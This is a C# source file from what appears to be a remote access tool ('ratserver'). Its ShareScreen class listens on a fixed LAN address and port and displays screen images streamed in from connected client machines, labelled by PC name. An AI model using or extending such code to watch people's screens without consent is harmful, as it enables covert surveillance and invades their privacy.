using ratserver;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

public static class ShareScreen 
{
    public static Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    static Client currentClient = null;
    public static ShareScreenForm form;
    static Bitmap bitmap;
    public static void Start()
    {
        client.Bind(new IPEndPoint(IPAddress.Parse("192.168.0.17"), 1421));
        client.Listen(1);
        form.FormClosing += (s, args) => 
        {
            if(currentClient != null)
            {
                ServerFunctions.SetShareScreen(currentClient, false);                               
            }
            form.Hide();
            args.Cancel = true;
        };
        while (ServerFunctions.Running)
        {
            Console.WriteLine("Listening on port 1421 for share screen.");
            Socket socket = client.Accept();

            string ip = ServerFunctions.GetIP(socket);
            currentClient = ServerFunctions.Clients.Find(x => ServerFunctions.GetIP(x.Socket) == ip);
            currentClient.StreamingScreen = true;

            ServerFunctions.Parent.Invoke(new Action(() => {
                if (form == null)
                    form = new ShareScreenForm();

                form.Text = currentClient.PCName + " share screen"; 
                form.Show();
            }));
            Console.WriteLine(currentClient + " connected share screen");
            while (true)
            {
                try
                {
                    MemoryStream stream = new MemoryStream();
                    int readSize = 4096;
                    byte[] buffer = new byte[readSize];
                    int read;
                    while ((read = socket.Receive(buffer)) > 0)
                    {
                        stream.Write(buffer, 0, read);
                        if (read < readSize) 
                        {
                            Thread.Sleep(5);
                            if (socket.Available == 0) // Image has been received                                                   
                                break;
                        };
                    }
                    if (read == 0)
                    {
                        Console.WriteLine(currentClient.PCName + " disconnected share screen");
                        socket.Dispose();
                        if (currentClient != null)
                            currentClient.StreamingScreen = false;

                        ServerFunctions.Parent.Invoke(new Action(() => form.Close()));
                        break;
                    }
                    try
                    {
                        bitmap = new Bitmap(stream);
                        form.SetBitmap(ref bitmap);
                    }
                    catch (ArgumentException)
                    {

                    }
                    finally
                    {
                        stream.Dispose();
                        bitmap.Dispose();
                    }
                }
                catch(SocketException ex) 
                {
                    ServerFunctions.Parent.Invoke(new Action(() => {
                        form.Close();
                    }));
                    Console.WriteLine(ex);
                    break;
                }
            }
        }
    }
}